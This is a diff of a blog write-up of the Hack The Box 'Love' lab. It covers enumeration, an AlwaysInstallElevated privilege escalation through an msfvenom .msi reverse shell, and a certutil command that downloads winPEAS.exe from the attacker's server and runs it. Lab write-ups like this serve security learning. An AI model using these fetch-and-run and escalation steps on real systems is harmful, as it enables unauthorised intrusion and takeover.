@@ -14,11 +14,11 @@ icon: icon-htb
 It's time to test my skills again on a **Windows** machine, in this case the [Hack The Box](https://www.hackthebox.com/){:target="_blank"} **Love** box. It's an easy machine, great for learning how to enumerate and use an automated script to find possible vectors to exploit vulnerabilities and take over the machine, here I go.
 
 <br/><br/>
-<img src="{{ site.img_path }}/love_writeup/Love.jpg" width="100%" style="margin: 0 auto;display: block
-; max-width: 400px;">
+<img src="{{ site.img_path }}/love_writeup/Love.png" width="100%" style="margin: 0 auto;display: block
+; max-width: 600px;">
 <br/><br/>
 
-I start as usual, I use the script of the great **Tito S4vi**, **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}**, to deploy the machine, and I can start and investigate about the box. If I list the open ports with `nmap`, as always on a **Windows** machine, it is scary how many there are, but you should always start from the most basic and known to start and list them. I see that there are several ports with **HTTP** protocols, also **SMB**, **HTTPS**, but I also see an interesting subdomain. If I analyze the **ssl** certificate with `openssl` I confirm the existence of the subdomain filtered by `nmap`.
+I start as usual, I use the script of the great **Tito S4vi**, **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}**, to deploy the machine, and I can start and investigate about the box. If I list the open ports with `nmap`, as always on a **Windows** machine, it is scary how many there are, but you should always start from the most basic and known to start and list them. I see that there are several ports with **HTTP** protocols, also **SMB**, **HTTPS**, but I also see an interesting subdomain. If I analyze the **ssl** certificate with `openssl` I confirm the existence of the subdomain leaked by `nmap`.
 
 ```bash
 ./htbExplorer -d Love
@@ -44,7 +44,7 @@ openssl s_client -connect 10.10.10.239:443
 ; max-width: 900px;">
 <br/><br/>
 
-If I filter for those web services that use the **HTTP** protocol, as I saw there were several, I can use `whatweb` to analyze the type of technologies I am dealing with. Some are available and some are not, if I access the service on port **80** from the browser, it is a sign in page, I try some common credentials and including **SQLi**, but it does not look good. **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, also does not show me a little more information.
+If I filter for those web services that use the **HTTP** protocol, as I saw there were several, I can use `whatweb` to disclose the technology stack behind the web application and I'm dealing with. Some are available and some are not, if I access the service on port **80** from the browser, it is a sign in page, I try some common credentials and including **SQLi**, but it does not look good. **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, also does not show me a little more information.
 
 ```bash
 cat targeted | grep http
@@ -63,7 +63,7 @@ whatweb http://10.10.10.239 https://10.10.10.239 http://10.10.10.239:5000 http:/
 ; max-width: 900px;">
 <br/><br/>
 
-Before I continue listing the box, I am going to modify my **Hosts** file to add the domain and subdomain I found earlier. I verify that my machine is resolving well and see if `whatweb` leaks me some more information, but I get nothing. If I access from the browser to the subdomain, I find a **subscription form** but analyzing the code, it seems that it is not working. But there is a **beta** functionality, which allows me to make a request to my machine, but I don't see a future for the moment, because I don't know if a malicious file can be uploaded to the machine.
+Before I continue listing the box, I'm going to modify my **Hosts** file to add the domain and subdomain I found earlier. I verify that my machine is resolving well and see if `whatweb` leaks me some more information, but I get nothing. If I access from the browser to the subdomain, I find a **subscription form** but analyzing the code, it seems that it is not working. But there is a **beta** functionality, which allows me to make a request to my machine, but I don't see a future for the moment, because I don't know if a malicious file can be uploaded to the machine.
 
 ```bash
 vi /etc/hosts
@@ -210,7 +210,7 @@ systeminfo
 ; max-width: 900px;">
 <br/><br/>
 
-After not finding much in the system, I am going to upload the **[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS ){:target="_blank"}** script from **Carlos Polop** that automates the search for possible attack vectors, to root the box. I transfer it to the victim machine and run it, after a while and analyzing the result, I find a vulnerability, having **AlwaysInstallElevated** enabled can result in a **Privilege Escalation**, as indicated by **[HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated){:target="_blank"}**. As the user has the permissions to install or run **`.msi`** files, I can create a binary with this extension and send me a **Reverse Shell**, using `msfvenom`. I transfer the malicious binary and I can get the shell as the **NT AUTHORITY\SYSTEM** user.
+After not finding much in the system, I'm going to upload the **[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS ){:target="_blank"}** script from **Carlos Polop** that automates the search for possible attack vectors, to root the box. I transfer it to the victim machine and run it, after a while and analyzing the result, I find a vulnerability, having **AlwaysInstallElevated** enabled can result in a **Privilege Escalation**, as indicated by **[HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated){:target="_blank"}**. As the user has the permissions to install or run **`.msi`** files, I can create a binary with this extension and send me a **Reverse Shell**, using `msfvenom`. I transfer the malicious binary and I can get the shell as the **NT AUTHORITY\SYSTEM** user.
 
 > **Tip**: When I get the results, I can't see the whole report, so I have to modify the **[Scrollback](https://lyz-code.github.io/blue-book/kitty/){:target="_blank"}** of `kitty`, modifying **kitty.conf**.
 
@@ -233,8 +233,7 @@ python3 -m http.server 80
 ```powershell
 certutil.exe -f -urlcache -split http://10.10.14.8/winPEAS.exe winPEAS.exe
 .\winPEAS.exe
-
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
 > **Attacking Machine**:
